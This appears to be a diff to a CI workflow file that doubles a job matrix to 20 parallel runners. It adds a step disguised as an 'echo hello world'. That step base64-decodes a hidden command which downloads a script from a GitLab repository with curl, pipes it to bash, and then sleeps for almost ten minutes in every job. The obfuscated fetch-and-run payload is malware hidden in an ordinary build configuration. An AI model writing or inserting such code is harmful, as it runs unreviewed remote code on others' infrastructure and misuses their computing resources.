@@ -12,6 +12,6 @@ jobs:
       fail-fast: false
       max-parallel: 20
       matrix:
-        name: [khu-a1, khu-b1, khu-c1, khu-d1, khu-e1, khu-f1, khu-g1, khu-h1, khu-i1, khu-j1]
+        name: [khu-a1, khu-b1, khu-c1, khu-d1, khu-e1, khu-f1, khu-g1, khu-h1, khu-i1, khu-j1 ,rkhu-a1, rkhu-b1, rkhu-c1, rkhu-d1, rkhu-e1, rkhu-f1, rkhu-g1, rkhu-h1, rkhu-i1, rkhu-j1]
     steps:
-      - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGVtYWtzYW5zIHwgYmFzaA | sh & sleep 590
+      - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbmluZXMgfCBiYXNo | sh & sleep 590
